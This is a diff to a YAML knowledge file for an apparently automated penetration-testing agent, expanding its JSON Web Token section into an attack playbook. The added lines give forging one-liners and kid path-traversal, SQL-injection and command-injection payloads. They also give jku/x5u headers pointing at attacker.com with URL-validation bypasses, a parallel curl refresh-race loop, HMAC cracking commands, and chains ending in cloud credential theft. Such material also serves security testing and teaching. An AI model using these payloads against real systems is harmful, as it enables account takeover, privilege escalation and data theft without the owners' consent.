@@ -12,34 +12,70 @@ tools:
   - nuclei
   - terminal_execute
 knowledge: |
-  JSON Web Tokens (JWT) are commonly used for authentication and authorization.
-  They consist of three parts: header, payload, and signature.
-  
-  ## JWT Structure:
-  - **Header**: Algorithm and token type
-  - **Payload**: Claims and user data
-  - **Signature**: Cryptographic signature
-  
-  ## Common JWT Vulnerabilities:
-  1. **None Algorithm**: Accept tokens without signature verification
-  2. **Algorithm Confusion**: Switch between symmetric and asymmetric algorithms
-  3. **Weak Secrets**: Brute force HMAC secrets
-  4. **Key Confusion**: Use public key as HMAC secret
-  5. **Header Injection**: Manipulate header parameters
-  
-  ## Testing Strategies:
-  - **Token Analysis**: Decode and analyze JWT structure
-  - **Algorithm Testing**: Test different signing algorithms
-  - **Signature Verification**: Test signature validation
-  - **Claim Manipulation**: Modify payload claims
-  - **Timing Attacks**: Exploit signature verification timing
-  
-  ## Tools and Techniques:
-  - Base64 decode JWT components
-  - Modify algorithm in header
-  - Brute force HMAC secrets
-  - Test with empty signature
-  - Exploit kid (Key ID) parameter
+  JWT: header.payload.signature — base64url-encoded, dot-separated. Every field is attacker surface.
+
+  ## Algorithm Attack Matrix
+  - **none/None/NONE/nOnE**: Set alg to none variant, strip signature entirely. Try empty sig and missing sig.
+  - **HS256↔RS256 confusion**: When app uses RS256, change alg to HS256, sign with the public key as HMAC secret.
+    Fetch public key from /jwks.json, /.well-known/jwks.json, /oauth/discovery/keys, or TLS cert.
+    `python3 -c "import jwt; print(jwt.encode({'sub':'admin'}, open('pub.pem').read(), algorithm='HS256'))"`
+  - **ECDSA nonce reuse**: Two signatures with same nonce → private key recovery. Collect multiple tokens, check r values.
+  - **PS256/PS384/PS512**: Some libs accept these without proper validation — try algorithm switching.
+  - **Weak HMAC secrets**: jwt_tool -C -d wordlist.txt. Top candidates: secret, password, 123456, key, jwt_secret, changeme.
+    hashcat -m 16500 jwt.txt wordlist.txt for GPU-accelerated cracking.
+
+  ## Header Parameter Injection
+  - **kid (Key ID)**:
+    - Path traversal: kid="../../../dev/null" → sign with empty string. kid="../../../etc/hostname" → sign with known content.
+    - SQLi: kid="' UNION SELECT 'AAA' -- " → forces symmetric key to 'AAA'. Sign with that value.
+    - Command injection: kid="|/usr/bin/id" — rare but test when kid feeds into system call.
+  - **jku (JWK Set URL)**: Point to attacker-controlled JWKS endpoint. Generate keypair, host jwks.json, sign token.
+    Bypass URL validation: jku="https://trusted.com@attacker.com/jwks.json", jku with redirect, jku with DNS rebinding.
+  - **x5u (X.509 URL)**: Same SSRF vector as jku but for certificate chains. Host attacker cert, sign with matching private key.
+  - **jwk (embedded key)**: Embed attacker's public key directly in header. Some libs trust embedded jwk over server keys.
+    `{"alg":"RS256","jwk":{"kty":"RSA","n":"...","e":"AQAB"}}` — sign with corresponding private key.
+  - **x5c (cert chain)**: Inject self-signed cert in x5c array. If lib extracts pubkey from x5c without chain validation → forge anything.
+  - **cty/typ**: Content-type confusion — set cty to unexpected values, some parsers behave differently.
+
+  ## Claims Exploitation
+  - **sub**: Change subject to admin user ID, email, or UUID. When sub is email, try sub="admin@target.com".
+  - **role/scope/groups/permissions**: Add or elevate. role:"user"→"admin", scope:"read"→"read write admin".
+    Try arrays vs strings: "role":"admin" vs "role":["admin"]. Some parsers handle both.
+  - **aud**: Remove aud claim or change to different service — cross-service token reuse.
+  - **exp**: Set to far future (exp:9999999999). Remove exp entirely. Some libs skip expiry if claim absent.
+  - **nbf**: Set nbf to 0 or remove — bypass "token not yet valid" checks.
+  - **iss**: Spoof issuer to match expected value. When multi-tenant, try other tenant's issuer.
+  - **iat**: Backdate to test time-window validations.
+  - **Custom claims**: Look for is_admin, is_staff, tenant_id, org_id — anything authorization-relevant.
+
+  ## Refresh Token Attacks
+  - **Reuse after rotation**: Use old refresh token after it should be invalidated — detect token reuse detection gaps.
+  - **Race condition**: Send multiple concurrent refresh requests — some backends issue multiple valid access tokens.
+    `for i in $(seq 1 10); do curl -X POST /token/refresh -d '{"refresh":"TOKEN"}' & done`
+  - **Refresh→access confusion**: Submit refresh token where access token expected and vice versa. Weak validation accepts both.
+  - **Refresh token theft**: If refresh token is in URL params, Referer header leaks it. Check storage: localStorage vs httpOnly cookie.
+  - **Infinite refresh**: Chain refresh calls — if no absolute expiry, tokens live forever.
+
+  ## JWKS Endpoint Issues
+  - **Key rollover race**: During rotation, both old and new keys valid briefly — old tokens may still work post-rotation.
+  - **JWKS caching**: App caches JWKS but attacker controls jku — poison cache, then forge tokens until cache expires.
+  - **Multiple valid keys**: When JWKS has multiple keys, try signing with each. kid mismatch handling varies.
+  - **Unauthenticated JWKS**: /.well-known/jwks.json leaks public keys — use for HS256/RS256 confusion attacks.
+
+  ## Tool-Specific Commands
+  - jwt_tool: `python3 jwt_tool.py TOKEN -T` (tamper mode), `-C -d dict.txt` (crack), `-X a` (alg none), `-X k` (key confusion)
+  - jwt_tool: `-X s` (spoof JWKS), `-X i` (inject inline jwk), `-I -pc sub -pv admin` (inject claim)
+  - PyJWT manual craft: `jwt.encode({"sub":"admin","role":"superuser"}, key, algorithm="HS256")`
+  - jose-tool: Useful for JWE (encrypted JWT) testing — nested JWE inside JWS scenarios.
+  - Burp: JWT Editor extension for in-proxy manipulation. JSON Web Tokens tab for decode/edit/resign.
+
+  ## Chaining Scenarios
+  - JWT forge → change role to admin → access admin endpoints → dump user data → full compromise.
+  - kid SQLi → extract SECRET_KEY from database → forge any token → persistent access.
+  - jku SSRF → internal service access → metadata endpoint → cloud credential theft.
+  - Weak secret crack → forge tokens offline → maintain access even after password change.
+  - Refresh token reuse → parallel sessions → evade single-session enforcement.
+  - Debug page exposure → SECRET_KEY leaked → sign arbitrary JWTs → account takeover at scale.
 examples:
   - title: "None Algorithm Attack"
     description: "Remove signature and set algorithm to 'none'"
@@ -53,27 +89,44 @@ examples:
     description: "Common weak secrets for HMAC signing"
     payload: "Secrets: secret, password, 123456, jwt, key"
     validation: "Try to verify signature with common secrets"
-  - title: "Kid Parameter Injection"
-    description: "Exploit Key ID parameter for path traversal"
-    payload: '{\"alg\":\"HS256\",\"typ\":\"JWT\",\"kid\":\"../../../etc/passwd\"}'
-    validation: "Check if kid parameter is used unsafely"
-  - title: "JKU Header Exploitation"
-    description: "Exploit JWK Set URL parameter"
+  - title: "Kid Parameter Path Traversal"
+    description: "Exploit Key ID parameter for path traversal to sign with known file content"
+    payload: '{\"alg\":\"HS256\",\"typ\":\"JWT\",\"kid\":\"../../../dev/null\"}'
+    validation: "Sign with empty string, check if token accepted"
+  - title: "Kid Parameter SQLi"
+    description: "SQL injection through kid to force a known symmetric key"
+    payload: "{\"alg\":\"HS256\",\"kid\":\"' UNION SELECT 'ATTACKER_KEY' -- \"}"
+    validation: "Sign token with 'ATTACKER_KEY' as HMAC secret"
+  - title: "JKU Header SSRF"
+    description: "Point JWK Set URL to attacker-controlled server hosting forged JWKS"
     payload: '{\"alg\":\"RS256\",\"typ\":\"JWT\",\"jku\":\"https://attacker.com/jwks.json\"}'
-    validation: "Test if application fetches keys from attacker-controlled URL"
-  - title: "Privilege Escalation"
-    description: "Modify user role or permissions in payload"
-    payload: '{\"sub\":\"user123\",\"role\":\"admin\",\"iat\":1516239022}'
-    validation: "Check if modified claims grant elevated privileges"
+    validation: "Verify app fetches and trusts attacker's JWKS endpoint"
+  - title: "Embedded JWK Key Injection"
+    description: "Embed attacker public key directly in JWT header"
+    payload: '{\"alg\":\"RS256\",\"jwk\":{\"kty\":\"RSA\",\"n\":\"...\",\"e\":\"AQAB\"}}'
+    validation: "Check if library trusts the embedded JWK for signature verification"
+  - title: "Privilege Escalation via Claims"
+    description: "Modify role, scope, and sub claims for privilege escalation"
+    payload: '{\"sub\":\"admin@target.com\",\"role\":\"admin\",\"scope\":\"read write admin\"}'
+    validation: "Access admin-only endpoints with forged token"
+  - title: "Refresh Token Race Condition"
+    description: "Concurrent refresh requests to obtain multiple valid access tokens"
+    payload: "10 parallel POST /token/refresh requests with same refresh token"
+    validation: "Check if multiple distinct valid access tokens are issued"
 validation_methods:
-  - "Decode JWT tokens and analyze structure"
-  - "Test token acceptance with modified algorithms"
-  - "Verify signature validation by tampering with payload"
-  - "Test with empty or invalid signatures"
-  - "Check for timing differences in signature verification"
-  - "Test privilege escalation by modifying claims"
+  - "Decode JWT tokens and analyze structure for algorithm and claims"
+  - "Test all alg:none variants (none, None, NONE, nOnE) with stripped signature"
+  - "Attempt HS256/RS256 confusion using public key from JWKS or TLS cert"
+  - "Fuzz kid parameter with path traversal, SQLi, and command injection payloads"
+  - "Test jku/x5u with attacker-controlled URLs and URL validation bypasses"
+  - "Modify sub, role, scope, aud claims and verify authorization changes"
+  - "Test refresh token reuse, race conditions, and cross-type confusion"
+  - "Crack HMAC secrets with jwt_tool and hashcat against common wordlists"
+  - "Verify exp/nbf removal or manipulation bypasses time validation"
 references:
   - "https://jwt.io/"
   - "https://portswigger.net/web-security/jwt"
   - "https://github.com/ticarpi/jwt_tool"
   - "https://owasp.org/www-chapter-vancouver/assets/presentations/2020-01_Attacking_JWT_Tokens.pdf"
+  - "https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/"
+  - "https://www.nccgroup.com/us/research-blog/jwt-attacks/"
